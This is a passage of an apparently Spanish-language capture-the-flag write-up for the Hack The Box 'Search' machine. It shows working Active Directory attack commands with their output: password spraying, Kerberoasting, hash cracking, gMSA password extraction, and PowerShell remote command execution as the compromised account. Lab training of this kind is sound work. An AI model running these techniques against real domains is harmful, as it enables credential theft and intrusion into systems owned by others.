realizamos Password Spraying con la \u0026ldquo;contraseña\u0026rdquo; IsolationIsKey?.\nUsuarios Válidos\r1 2 3 4 5 6 keely.lyons dax.santiago sierra.frye administrator research hope.sharp Observamos que hope.sharp es una combinación válida, como se menciona en la nota.\n1 2 3 4 5 6 7 8 9 π ~/htb/search ❯ crackmapexec smb search.htb -u usernames/valid_users.txt -p \u0026#39;IsolationIsKey?\u0026#39; --continue-on-success SMB search.htb 445 RESEARCH [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False) SMB search.htb 445 RESEARCH [-] search.htb\\keely.lyons:IsolationIsKey? STATUS_LOGON_FAILURE SMB search.htb 445 RESEARCH [-] search.htb\\dax.santiago:IsolationIsKey? STATUS_LOGON_FAILURE SMB search.htb 445 RESEARCH [-] search.htb\\sierra.frye:IsolationIsKey? STATUS_LOGON_FAILURE SMB search.htb 445 RESEARCH [-] search.htb\\administrator:IsolationIsKey? STATUS_LOGON_FAILURE SMB search.htb 445 RESEARCH [-] search.htb\\research:IsolationIsKey? STATUS_LOGON_FAILURE SMB search.htb 445 RESEARCH [+] search.htb\\hope.sharp:IsolationIsKey? π ~/htb/search ❯ Vemos tambien que las credenciales permiten el acceso por ldap.\n1 2 3 4 π ~/htb/search ❯ crackmapexec ldap search.htb -u \u0026#39;hope.sharp\u0026#39; -p \u0026#39;IsolationIsKey?\u0026#39; SMB search.htb 445 RESEARCH [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False) LDAP search.htb 389 RESEARCH [+] search.htb\\hope.sharp:IsolationIsKey? π ~/htb/search ❯ SMB Enumeramos los recursos compartidos a los que Hope tiene acceso, vemos: CertEnroll, RedirectedFolders$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 π ~/htb/search ❯ crackmapexec smb search.htb -u \u0026#39;hope.sharp\u0026#39; -p \u0026#39;IsolationIsKey?\u0026#39; --shares SMB search.htb 445 RESEARCH [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False) SMB search.htb 445 RESEARCH [+] search.htb\\hope.sharp:IsolationIsKey? SMB search.htb 445 RESEARCH [+] Enumerated shares SMB search.htb 445 RESEARCH Share Permissions Remark SMB search.htb 445 RESEARCH ----- ----------- ------ SMB search.htb 445 RESEARCH ADMIN$ Remote Admin SMB search.htb 445 RESEARCH C$ Default share SMB search.htb 445 RESEARCH CertEnroll READ Active Directory Certificate Services share SMB search.htb 445 RESEARCH helpdesk SMB search.htb 445 RESEARCH IPC$ READ Remote IPC SMB search.htb 445 RESEARCH NETLOGON READ Logon server share SMB search.htb 445 RESEARCH RedirectedFolders$ READ,WRITE SMB search.htb 445 RESEARCH SYSVOL READ Logon server share π ~/htb/search ❯ En CertEnroll encontramos tres certificados, aunque no son para el sitio restringido.\n1 2 3 4 5 6 7 8 9 10 11 12 13 π ~/htb/search/certenroll ❯ smbclient //search.htb/CertEnroll -U \u0026#39;hope.sharp\u0026#39; # IsolationIsKey? Enter WORKGROUP\\hope.sharp\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . Dc 0 Tue Apr 5 00:51:28 2022 .. Dc 0 Tue Apr 5 00:51:28 2022 nsrev_search-RESEARCH-CA.asp Ac 330 Tue Apr 7 03:29:31 2020 Research.search.htb_search-RESEARCH-CA.crt Ac 883 Tue Apr 7 03:29:29 2020 search-RESEARCH-CA+.crl Ac 735 Tue Apr 5 00:51:28 2022 search-RESEARCH-CA.crl Ac 1047 Tue Apr 5 00:51:28 2022 3246079 blocks of size 4096. 420635 blocks available smb: \\\u0026gt; En RedirectedFolders$ encontramos directorios con nombres de usuarios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 π ~/htb/search ❯ smbclient //search.htb/RedirectedFolders$ -U \u0026#39;hope.sharp\u0026#39; # IsolationIsKey? Enter WORKGROUP\\hope.sharp\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . Dc 0 Tue Apr 5 22:27:00 2022 .. Dc 0 Tue Apr 5 22:27:00 2022 abril.suarez Dc 0 Tue Apr 7 14:12:58 2020 Angie.Duffy Dc 0 Fri Jul 31 09:11:32 2020 Antony.Russo Dc 0 Fri Jul 31 08:35:32 2020 belen.compton Dc 0 Tue Apr 7 14:32:31 2020 Cameron.Melendez Dc 0 Fri Jul 31 08:37:36 2020 chanel.bell Dc 0 Tue Apr 7 14:15:09 2020 Claudia.Pugh Dc 0 Fri Jul 31 09:09:08 2020 Cortez.Hickman Dc 0 Fri Jul 31 08:02:04 2020 dax.santiago Dc 0 Tue Apr 7 14:20:08 2020 Eddie.Stevens Dc 0 Fri Jul 31 07:55:34 2020 edgar.jacobs Dc 0 Thu Apr 9 16:04:11 2020 Edith.Walls Dc 0 Fri Jul 31 08:39:50 2020 eve.galvan Dc 0 Tue Apr 7 14:23:13 2020 frederick.cuevas Dc 0 Tue Apr 7 14:29:22 2020 hope.sharp Dc 0 Thu Apr 9 10:34:41 2020 jayla.roberts Dc 0 Tue Apr 7 14:07:00 2020 Jordan.Gregory Dc 0 Fri Jul 31 09:01:06 2020 payton.harmon Dc 0 Thu Apr 9 16:11:39 2020 Reginald.Morton Dc 0 Fri Jul 31 07:44:32 2020 santino.benjamin Dc 0 Tue Apr 7 14:10:25 2020 Savanah.Velazquez Dc 0 Fri Jul 31 08:21:42 2020 sierra.frye Dc 0 Wed Nov 17 20:01:46 2021 trace.ryan Dc 0 Thu Apr 9 16:14:26 2020 3246079 blocks of size 4096. 420632 blocks available smb: \\\u0026gt; Encontramos en el directorio de sierra.frye la flag user.txt pero no tenemos acceso a esta.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 smb: \\sierra.frye\\Desktop\\\u0026gt; ls . DRc 0 Wed Nov 17 20:08:00 2021 .. DRc 0 Wed Nov 17 20:08:00 2021 $RECYCLE.BIN DHSc 0 Tue Apr 7 14:03:59 2020 desktop.ini AHSc 282 Fri Jul 31 10:42:15 2020 Microsoft Edge.lnk Ac 1450 Tue Apr 7 08:28:05 2020 user.txt Ac 33 Wed Nov 17 19:55:27 2021 \\sierra.frye\\Desktop\\$RECYCLE.BIN . DHSc 0 Tue Apr 7 14:03:59 2020 .. DHSc 0 Tue Apr 7 14:03:59 2020 desktop.ini AHSc 129 Tue Apr 7 14:04:00 2020 3246079 blocks of size 4096. 420632 blocks available smb: \\sierra.frye\\Desktop\\\u0026gt; get user.txt NT_STATUS_ACCESS_DENIED opening remote file \\sierra.frye\\Desktop\\user.txt smb: \\sierra.frye\\Desktop\\\u0026gt; SMB - Web_svc BloodHound Utilizamos Bloodhound.py para obtener información del AD, utilizando las credenciales de hope.sharp.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 π BloodHound.py master ❯ ./bloodhound.py -u hope.sharp -p \u0026#39;IsolationIsKey?\u0026#39; -d SEARCH.HTB -ns 10.10.11.129 -c all --zip INFO: Found AD domain: search.htb INFO: Connecting to LDAP server: research.search.htb INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 113 computers INFO: Connecting to LDAP server: research.search.htb INFO: Found 107 users INFO: Found 64 groups INFO: Found 0 trusts [.. snip ..] INFO: Done in 00M 46S INFO: Compressing output into 20220405224732_bloodhound.zip π BloodHound.py master ❯ l total 1.9M drwxr-xr-x 6 kali kali 4.0K Apr 5 23:07 . drwxr-xr-x 12 kali kali 4.0K Apr 5 22:33 .. -rw-r--r-- 1 kali kali 289K Apr 5 22:46 20220405224540_computers.json -rw-r--r-- 1 kali kali 2.5K Apr 5 22:45 20220405224540_domains.json -rw-r--r-- 1 kali kali 92K Apr 5 22:45 20220405224540_groups.json -rw-r--r-- 1 kali kali 246K Apr 5 22:45 20220405224540_users.json -rw-r--r-- 1 kali kali 202K Apr 5 22:47 20220405224652_computers.json -rw-r--r-- 1 kali kali 2.5K Apr 5 22:47 20220405224652_domains.json -rw-r--r-- 1 kali kali 92K Apr 5 22:47 20220405224652_groups.json -rw-r--r-- 1 kali kali 246K Apr 5 22:46 20220405224652_users.json -rw-r--r-- 1 kali kali 629K Apr 5 22:48 20220405224732_bloodhound.zip drwxr-xr-x 6 kali kali 4.0K Mar 7 21:13 bloodhound -rwxr-xr-x 1 kali kali 61 Mar 7 21:10 bloodhound.py drwxr-xr-x 3 kali kali 4.0K Mar 7 21:11 build -rw-r--r-- 1 kali kali 855 Mar 7 21:10 Dockerfile -rw-r--r-- 1 kali kali 227 Mar 7 21:10 .editorconfig drwxr-xr-x 8 kali kali 4.0K Mar 7 21:10 .git -rw-r--r-- 1 kali kali 49 Mar 7 21:10 .gitignore -rw-r--r-- 1 kali kali 1.1K Mar 7 21:10 LICENSE drwxr-xr-x 2 kali kali 4.0K Mar 7 21:22 out -rw-r--r-- 1 kali kali 3.4K Mar 7 21:10 README.md -rw-r--r-- 1 kali kali 1.3K Mar 7 21:10 setup.py π BloodHound.py master ❯ Ejecutamos bloodhound e importamos el archivo zip generado.\nUtilizando los queries predefinidos de bloodhound, listamos los usuarios Kerberoastables, vemos dos web_svc, krbtgt.\nKerberoasting Utilizamos impacket para realizar Kerberoasting, tras ejecutar el script obtuvimos el hash del usuario web_svc.\n1 2 3 4 5 6 7 8 9 10 π ~/htb/search ❯ impacket-GetUserSPNs search.htb/hope.sharp:\u0026#39;IsolationIsKey?\u0026#39; -outputfile web_svc_kerberos Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation --------------------------------- ------- -------- -------------------------- --------- ---------- RESEARCH/web_svc.search.htb:60001 web_svc 2020-04-09 08:59:11.329031 \u0026lt;never\u0026gt; π ~/htb/search ❯ cat web_svc_kerberos $krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$9e3da68e2397f9818dbf60d3b7ec89bc$9cce89c2d1111f89d641e3bc4f61b2b894f825354c4acf77d112a7f881824ede1bca3720de4dfe3e577d147d055aba669bcdec5fd63c128c9d4970787c0d5bfc621dbcd26de33e5707a552eeebb2f78400cd24975a2653a17987d311335f6b8da2d26617c8f40cc8d27aece739460529c211fccac30b3f84e3e2d615049f78fd1c283e3a2e4265e01ed7835fef1903a2f60f25ec9fe1d6579ca1a87d8f783d83df6252dc36e1c3af2434e88ffc6f94e54416e9e58111608d386a62e22f79d5ab0f8e698b293573a464347bd3225cf03cbfa0342150753ed2adfba17ce446e59fe0ee8350eb06b2e2e8f4d379f9c5f471bdccb29e98badf4419d3e0571510138e5ae2f4d7ab469690731cd220c90f3ea04d3e2e25fdba065ba808530b442dc6ab5120dcb64c40f020f2d32278d47cee2c9771e6ab8a4b4b980b7858712018d0bf6ecfdf703fb22ef271297b94a08a992545e477030c45306e7031869a4fb749cb2981cc52f23ce24605100ade6427848710a3c89c6002aa4595194ed70b7663b31a0ae6273ce695e66cff69d1883d19ccd537158feb252bfccdbb272c5b6b1c98a3843c9798c3ca59b4c212ec0e2f48c96ee344e08c6ec19b414875576fc78dba7db3297dc6c07e33e0b445e395993e5b0d5326280e502e9b8d7f1304aea083f907ccd695e4d0ae53566f17cb67020c8c82e641a097f20f887a89c7a8ccef0303a07c7489daf0b4c6faa12546649d950781c69a5965c1bb3928091acc103f347acf9781c731fecc00b07ed9d368c251662839fa302bd3dd0060994425449b40d3b69650b00c6c6b80e8f263b922b7e063c9cb1f07402904b295c4ff3d7971bc986aa82aa658dcd2f504bb6d7c21d9eb5e44cf561ee3eb62e8ea123de132afe171555b2d32ede6c60cd5e38388a55c5a171df811e645499c3dcd294ac5e3f7e851d391d2f7a2b3b639e56b1a5efc9fe56b97a872079f05bba897022fd48c4749cf291c8fd50fdc0718cdcf33d89d00dcf17b537614305dbff34c3bfba6af5f659ae8f3a18ec93e6f34f1a9b3f623c897b0fa614f68afdf289565219789c2c214f988d0dcfd4dedb47805ead3514e83189c950044f1a6ba6b5f5707e76ca8f3f68ac3683d689373d76c77a20fe545fb6979ae9474539539548e61729f777b2fc7d54bf8c6d379b67380bb5e6345f21ea0bfccc2d64a0600d0373b4d1469cf9d9ce0e831cd011c5fa5ee3ea0619376325548c057bd199645db442d680d4fc2436eb234978af2717098a8ba961e0fb2ddb3c10a593648801646054547a5bc7db4edb8b4183731a8b440cfde93c4bd308052e05c7d4c3cc0e0ac2b207d2c9169ac837f916093127a33e1b8677dbd81d7fac2e4f6728b0e05c68fa7d3f25603ace165d9fbd443708af2813a97514f77557b5a117046af3054eddb1cbca74fd18c4fce6c4a283fc9fe32e315215256d9778a4fae323264d3d9 π ~/htb/search ❯ Password Hash Cracking Utilizando John con el diccionario rockyou.txt logramos obtener en texto plano el valor del hash.\n1 2 3 4 5 6 7 8 9 10 π ~/htb/search ❯ john --wordlist=$ROCK web_svc_kerberos Using default input encoding: UTF-8 Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status @3ONEmillionbaby (?) 1g 0:00:00:07 DONE (2022-03-09 20:39) 0.1285g/s 1476Kp/s 1476Kc/s 1476KC/s @421eduymayte619..@#ann!# Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. π ~/htb/search ❯ El usuario web_svc tiene acceso a los mismos recursos que hope.sharp, sin embargo no encontramos información nueva.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 π ~/htb/search ❯ crackmapexec smb search.htb -u web_svc -p \u0026#39;@3ONEmillionbaby\u0026#39; --shares SMB search.htb 445 RESEARCH [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False) SMB search.htb 445 RESEARCH [+] search.htb\\web_svc:@3ONEmillionbaby SMB search.htb 445 RESEARCH [+] Enumerated shares SMB search.htb 445 RESEARCH Share Permissions Remark SMB search.htb 445 RESEARCH ----- ----------- ------ SMB search.htb 445 RESEARCH ADMIN$ Remote Admin SMB search.htb 445 RESEARCH C$ Default share SMB search.htb 445 RESEARCH CertEnroll READ Active Directory Certificate Services share SMB search.htb 445 RESEARCH helpdesk SMB search.htb 445 RESEARCH IPC$ READ Remote IPC SMB search.htb 445 RESEARCH NETLOGON READ Logon server share SMB search.htb 445 RESEARCH RedirectedFolders$ READ,WRITE SMB search.htb 445 RESEARCH SYSVOL READ Logon server share π ~/htb/search ❯ SMB - Edgar Jacobs Utilizando los usuarios que encontramos con bloodhound y las dos contraseñas ya conocidas, realizamos nuevamente Password Spraying.\n1 2 3 4 5 6 7 π ~/htb/search/usernames ❯ cat ../BloodHound.py/20220405224540_users.json|jq|grep \u0026#39;\u0026#34;name\u0026#34;:\u0026#34;*\u0026#39;| cut -d \u0026#39; \u0026#39; -f10| cut -d \u0026#39;@\u0026#39; -f1| tr -d \u0026#39;\u0026#34;\u0026#39; \u0026gt; bloodhound_users.txt π ~/htb/search/usernames ❯ wc -l bloodhound_users.txt 107 bloodhound_users.txt π ~/htb/search/usernames ❯ cat passwords.txt @3ONEmillionbaby IsolationIsKey? π ~/htb/search/usernames ❯ Encontramos que el usuario Edgar.Jacobs tiene acceso con la contraseña @3ONEmillionbaby, al igual que web_svc.\n1 2 3 4 5 6 7 8 9 π ~/htb/search/usernames ❯ crackmapexec smb search.htb -u bloodhound_users.txt -p passwords.txt --continue-on-success SMB search.htb 445 RESEARCH [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False) SMB search.htb 445 RESEARCH [+] search.htb\\WEB_SVC:@3ONEmillionbaby [.. snip ..] SMB search.htb 445 RESEARCH [+] search.htb\\HOPE.SHARP:IsolationIsKey? [.. snip ..] SMB search.htb 445 RESEARCH [+] search.htb\\EDGAR.JACOBS:@3ONEmillionbaby [.. snip ..] π ~/htb/search/usernames ❯ SMB Al enumerar los recursos de este usuario, vemos que tiene acceso a: CertEnroll, helpdesk, RedirectedFolders$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 π ~/htb/search/usernames ❯ crackmapexec smb search.htb -u EDGAR.JACOBS -p \u0026#34;@3ONEmillionbaby\u0026#34; --shares SMB search.htb 445 RESEARCH [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False) SMB search.htb 445 RESEARCH [+] search.htb\\EDGAR.JACOBS:@3ONEmillionbaby SMB search.htb 445 RESEARCH [+] Enumerated shares SMB search.htb 445 RESEARCH Share Permissions Remark SMB search.htb 445 RESEARCH ----- ----------- ------ SMB search.htb 445 RESEARCH ADMIN$ Remote Admin SMB search.htb 445 RESEARCH C$ Default share SMB search.htb 445 RESEARCH CertEnroll READ Active Directory Certificate Services share SMB search.htb 445 RESEARCH helpdesk READ SMB search.htb 445 RESEARCH IPC$ READ Remote IPC SMB search.htb 445 RESEARCH NETLOGON READ Logon server share SMB search.htb 445 RESEARCH RedirectedFolders$ READ,WRITE SMB search.htb 445 RESEARCH SYSVOL READ Logon server share π ~/htb/search/usernames ❯ En el recurso helpdesk no existe ningun archivo.\n1 2 3 4 5 6 7 8 9 π ~/htb/search/usernames ❯ smbclient //search.htb/helpdesk -U \u0026#39;edgar.jacobs\u0026#39; # @3ONEmillionbaby Enter WORKGROUP\\edgar.jacobs\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . Dc 0 Tue Apr 14 06:24:23 2020 .. Dc 0 Tue Apr 14 06:24:23 2020 3246079 blocks of size 4096. 418870 blocks available smb: \\\u0026gt; Phishing - Passwords Al revisar el recurso RedirectedFolders$ encontramos un archivo .xlsx en el directorio de Edgar.Jacobs.\n1 2 3 4 5 6 7 8 9 10 smb: \\edgar.jacobs\\Desktop\\\u0026gt; ls . DRc 0 Mon Aug 10 06:02:16 2020 .. DRc 0 Mon Aug 10 06:02:16 2020 $RECYCLE.BIN DHSc 0 Thu Apr 9 16:05:29 2020 desktop.ini AHSc 282 Mon Aug 10 06:02:16 2020 Microsoft Edge.lnk Ac 1450 Thu Apr 9 16:05:03 2020 Phishing_Attempt.xlsx Ac 23130 Mon Aug 10 06:35:44 2020 3246079 blocks of size 4096. 418861 blocks available smb: \\edgar.jacobs\\Desktop\\\u0026gt; Tras revisar el archivo, encontramos que existen 2 hojas, una de ellas está protegida por contraseña además vemos en esta una celda oculta (Celda C).\nUtilizando xlsx2csv logramos obtener el valor de la hoja y celda protegida, observamos que son contraseñas.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 π ~/htb/search/phishing ❯ xlsx2csv Phishing_Attempt.xlsx sheets -a π ~/htb/search/phishing ❯ cd sheets π ~/htb/search/phishing/sheets ❯ ls Captured.csv \u0026#39;Passwords 01082020.csv\u0026#39; π ~/htb/search/phishing/sheets ❯ cat Captured.csv Date,Captured Passwords, 01-01-18,78, [.. snip ..] 06-01-19,81, 07-01-19,79,IT ChangeOver Keely Lyons Started 08-01-19,72, [.. snip ..] 04-01-21,14, π ~/htb/search/phishing/sheets ❯ cat Passwords\\ 01082020.csv firstname,lastname,password,Username Payton,Harmon,;;36!cried!INDIA!year!50;;,Payton.Harmon Cortez,Hickman,..10-time-TALK-proud-66..,Cortez.Hickman Bobby,Wolf,??47^before^WORLD^surprise^91??,Bobby.Wolf Margaret,Robinson,//51+mountain+DEAR+noise+83//,Margaret.Robinson Scarlett,Parks,++47|building|WARSAW|gave|60++,Scarlett.Parks Eliezer,Jordan,!!05_goes_SEVEN_offer_83!!,Eliezer.Jordan Hunter,Kirby,~~27%when%VILLAGE%full%00~~,Hunter.Kirby Sierra,Frye,$$49=wide=STRAIGHT=jordan=28$$18,Sierra.Frye Annabelle,Wells,==95~pass~QUIET~austria~77==,Annabelle.Wells Eve,Galvan,//61!banker!FANCY!measure!25//,Eve.Galvan Jeramiah,Fritz,??40:student:MAYOR:been:66??,Jeramiah.Fritz Abby,Gonzalez,\u0026amp;\u0026amp;75:major:RADIO:state:93\u0026amp;\u0026amp;,Abby.Gonzalez Joy,Costa,**30*venus*BALL*office*42**,Joy.Costa Vincent,Sutton,**24\u0026amp;moment\u0026amp;BRAZIL\u0026amp;members\u0026amp;66**,Vincent.Sutton ,,, π ~/htb/search/phishing/sheets ❯ Creamos dos wordlist con contraseñas y usuarios, a partir del archivo .csv generado.\n1 2 3 4 5 6 7 π ~/htb/search/phishing/sheets ❯ cat Passwords\\ 01082020.csv | cut -d \u0026#39;,\u0026#39; -f3 \u0026gt; phish_passwords.txt π ~/htb/search/phishing/sheets ❯ wc -l phish_passwords.txt 17 phish_passwords.txt π ~/htb/search/phishing/sheets ❯ cat Passwords\\ 01082020.csv | cut -d \u0026#39;,\u0026#39; -f4 \u0026gt; phish_usernames.txt π ~/htb/search/phishing/sheets ❯ wc -l phish_usernames.txt 17 phish_usernames.txt π ~/htb/search/phishing/sheets ❯ Combinamos los wordlist phish_usernames.txt y bloodhound_users.txt, de igual forma phish_passwords.txt y passwords.txt.\n1 2 3 4 5 6 7 π ~/htb/search/usernames ❯ cat bloodhound_users.txt ../phishing/sheets/phish_usernames.txt | tr \u0026#39;[:upper:]\u0026#39; \u0026#39;[:lower:]\u0026#39; | sort | uniq \u0026gt; blood_phish_usernames.txt π ~/htb/search/usernames ❯ cat bloodhound_users.txt ../phishing/sheets/phish_usernames.txt | tr \u0026#39;[:upper:]\u0026#39; \u0026#39;[:lower:]\u0026#39; | sort | uniq | wc -l 109 π ~/htb/search/usernames ❯ cat passwords.txt ../phishing/sheets/phish_passwords.txt \u0026gt; phish_known_passwords.txt π ~/htb/search/usernames ❯ wc -l phish_known_passwords.txt 19 phish_known_passwords.txt π ~/htb/search/usernames ❯ User - Sierra Frye Nuevamente realizamos \u0026lsquo;brute force\u0026rsquo; utilizando las contraseñas y usuarios nuevos encontrados. Encontramos la contraseña para sierra.frye.\n1 2 3 4 5 6 7 8 9 10 11 π ~/htb/search/usernames ❯ crackmapexec smb search.htb -u blood_phish_usernames.txt -p phish_known_passwords.txt --continue-on-success|grep -v \u0026#39;STATUS_LOGON_FAILURE\u0026#39; SMB search.htb 445 RESEARCH [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False) SMB search.htb 445 RESEARCH [-] search.htb\\: STATUS_ACCESS_DENIED SMB search.htb 445 RESEARCH [-] search.htb\\: STATUS_ACCESS_DENIED SMB search.htb 445 RESEARCH [+] search.htb\\edgar.jacobs:@3ONEmillionbaby SMB search.htb 445 RESEARCH [-] search.htb\\guest: STATUS_ACCOUNT_DISABLED SMB search.htb 445 RESEARCH [-] search.htb\\guest: STATUS_ACCOUNT_DISABLED SMB search.htb 445 RESEARCH [+] search.htb\\hope.sharp:IsolationIsKey? SMB search.htb 445 RESEARCH [+] search.htb\\sierra.frye:$$49=wide=STRAIGHT=jordan=28$$18 SMB search.htb 445 RESEARCH [+] search.htb\\web_svc:@3ONEmillionbaby π ~/htb/search/usernames ❯ Ingresamos a RedirectedFolders$ donde encontramos y descargamos la flag user.txt.\n1 2 3 π ~/htb/search ❯ cat user.txt ad2a8266d4a4767ffe773770a94de7d9 π ~/htb/search ❯ Certs Además en la carpeta \\backup observamos dos certificados que seguramente estan relacionados a la página /staff.\n1 2 3 4 5 6 7 8 smb: \\sierra.frye\\downloads\\backups\\\u0026gt; ls . DHc 0 Mon Aug 10 16:39:17 2020 .. DHc 0 Mon Aug 10 16:39:17 2020 search-RESEARCH-CA.p12 Ac 2643 Fri Jul 31 11:04:11 2020 staff.pfx Ac 4326 Mon Aug 10 16:39:17 2020 3246079 blocks of size 4096. 676825 blocks available smb: \\sierra.frye\\downloads\\backups\\\u0026gt; Al intentar importar los certificados vemos que ambos estan protegidos por una contraseña.\nPassword Hash Cracking Utilizamos pfx2john.py para obtener el hash de ambos certificados, y utilizando john con el wordlist rockyou.txt logramos obtener la contraseña para ambos, la cual es la misma.\nbash\rbash\r1 2 3 4 5 6 7 8 9 10 11 12 π ~/htb/search/cert_sierra ❯ john --wordlist=$ROCK staff_pfx_hash Using default input encoding: UTF-8 Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x]) Cost 1 (iteration count) is 2000 for all loaded hashes Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status misspissy (staff.pfx) 1g 0:00:01:20 DONE (2022-03-10 20:00) 0.01237g/s 67886p/s 67886c/s 67886C/s misssnamy..missnono Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. π ~/htb/search/cert_sierra ❯ 1 2 3 4 5 6 7 8 9 10 11 12 π ~/htb/search/cert_sierra ❯ john --wordlist=$ROCK search_p12_hash Using default input encoding: UTF-8 Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x]) Cost 1 (iteration count) is 2000 for all loaded hashes Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status misspissy (search-RESEARCH-CA.p12) 1g 0:00:01:30 DONE (2022-03-10 20:02) 0.01110g/s 60878p/s 60878c/s 60878C/s misssnamy..missnono Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. π ~/htb/search/cert_sierra ❯ PowerShell Web Importamos y seleccionamos el certificado de staff.pfx tras visitar /staff.\nVemos un panel de acceso por PowerShell.\nUtilizando las credenciales de sierra.frye logramos acceder a este.\nSierra.Frye\r1 2 3 USER: sierra.frye PASS: $$49=wide=STRAIGHT=jordan=28$$18 COMPUTER NAME: RESEARCH Privesc Tras examinar los directorios, no encontramos información relevante, por lo que revisamos nuevamente la información en Bloodhound.\nBloodHound Utilizando los queries predefinidos encontramos una ruta para obtener acceso como Domain Admin.\nInicialmente vemos a sierra.frye miembro de los grupos Birmingham-ITSec, ITSec, este último puede obtener la contraseña del usuario BIR-ADFS-GMSA. Seguidamente vemos que BIR-ADFS-GMSA tiene permisos GenericAll sobre el usuario Tristan.Davies el cual pertenece al grupo de Domain Admins.\nBIR-ADFS-GMSA GMSA Bloodhound sugiere utilizar gmsapasswordreader.exe aunque no fué posible conectarnos desde la máquina a nuestro servidor samba para descargar este ejecutable.\nUtilizamos gMSADumper para obtener el hash de BIR-ADFS-GMSA utilizando las credenciales de sierra.frye.\n1 2 3 4 5 π gMSADumper main ✗ ❯ ./gMSADumper.py -u sierra.frye -p \u0026#39;$$49=wide=STRAIGHT=jordan=28$$18\u0026#39; -l 10.10.11.129 -d search.htb Users or groups who can read password for BIR-ADFS-GMSA$: \u0026gt; ITSec BIR-ADFS-GMSA$:::e1e9fd9e46d0d747e1595167eedcec0f π gMSADumper main ✗ ❯ Sin embargo, tras intentar autenticarnos con el hash no fué posible, de igual forma crackear el hash.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 π ~/htb/search ❯ impacket-psexec \u0026#34;BIR-ADFS-GMSA$\u0026#34;@search.htb -hashes :e1e9fd9e46d0d747e1595167eedcec0f Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] Requesting shares on search.htb..... [-] share \u0026#39;ADMIN$\u0026#39; is not writable. [-] share \u0026#39;C$\u0026#39; is not writable. [-] share \u0026#39;CertEnroll\u0026#39; is not writable. [-] share \u0026#39;helpdesk\u0026#39; is not writable. [-] share \u0026#39;NETLOGON\u0026#39; is not writable. [*] Found writable share RedirectedFolders$ [*] Uploading file WFSVyazG.exe [*] Opening SVCManager on search.htb..... [-] Error opening SVCManager on search.htb..... [-] Error performing the installation, cleaning up: Unable to open SVCManager π ~/htb/search ❯ Investigando sobre GMSA en Windows encontramos un post sobre ReadGMSAPassword en PowerShell, donde se muestran comandos para la lectura de la contraseña.\n1 2 3 $gmsa = Get-ADServiceAccount -Identity \u0026#39;BIR-ADFS-GMSA$\u0026#39; -Properties \u0026#39;msDS-ManagedPassword\u0026#39; $mp = $gmsa.\u0026#39;msDS-ManagedPassword\u0026#39; ConvertFrom-ADManagedPasswordBlob $mp Tras ejecutar los comandos vemos la contraseña en \u0026rsquo;texto plano\u0026rsquo; pero toma caracteres ilegibles, aunque vemos que tiene la \u0026lsquo;propiedad\u0026rsquo; SecureString lo que podríamos utilizar para ejecutar comandos como en Arkham - HTB.\nInicialmente en la variable $secure vamos a obtener la propiedad SecureString para usarla como contraseña en PSCredential.\n1 2 3 4 5 6 7 8 9 # GMSA $gmsa = Get-ADServiceAccount -Identity \u0026#39;BIR-ADFS-GMSA$\u0026#39; -Properties \u0026#39;msDS-ManagedPassword\u0026#39; $mp = $gmsa.\u0026#39;msDS-ManagedPassword\u0026#39; $secure = ConvertFrom-ADManagedPasswordBlob $mp # Credentials $username =\u0026#34;BIR-ADFS-GMSA\u0026#34;; $password = $secure.SecureCurrentPassword; $cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username, $password; Finalmente con Invoke-Command ejecutamos comandos.\n1 2 # Run Commands Invoke-Command -ScriptBlock { whoami } -ComputerName RESEARCH -Credential $cred Tras ejecutar el último comando vemos que tenemos acceso como BIR-ADFS-GMSA.\nTristan Davies Como sabemos BIR-ADFS-GMSA tiene permisos GenericAll sobre tristan.davies, segun 